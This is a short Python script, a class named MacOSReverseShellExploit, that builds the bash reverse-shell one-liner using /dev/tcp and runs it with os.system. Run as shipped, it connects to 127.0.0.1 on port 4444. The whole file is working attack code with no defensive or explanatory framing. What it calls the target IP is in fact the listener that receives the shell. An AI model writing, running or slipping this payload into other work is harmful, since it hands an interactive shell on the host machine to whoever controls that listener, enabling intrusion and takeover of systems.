import os

class MacOSReverseShellExploit:
    def __init__(self, target_ip, port=4444):
        self.target_ip = target_ip
        self.port = port
        print(f"[*] MacOSReverseShellExploit initialized for target {self.target_ip} on port {self.port}")

    def generate_payload(self):
        """Generate a bash reverse shell payload for macOS/Linux."""
        payload = (
            f"bash -i >& /dev/tcp/{self.target_ip}/{self.port} 0>&1"
        )
        print(f"[*] Generated payload: {payload}")
        return payload

    def execute(self):
        """Executes the reverse shell payload."""
        payload = self.generate_payload()
        print(f"[*] Executing macOS/Linux reverse shell payload: {payload}")
        os.system(payload)

if __name__ == "__main__":
    exploit = MacOSReverseShellExploit("127.0.0.1", 4444)
    exploit.execute()
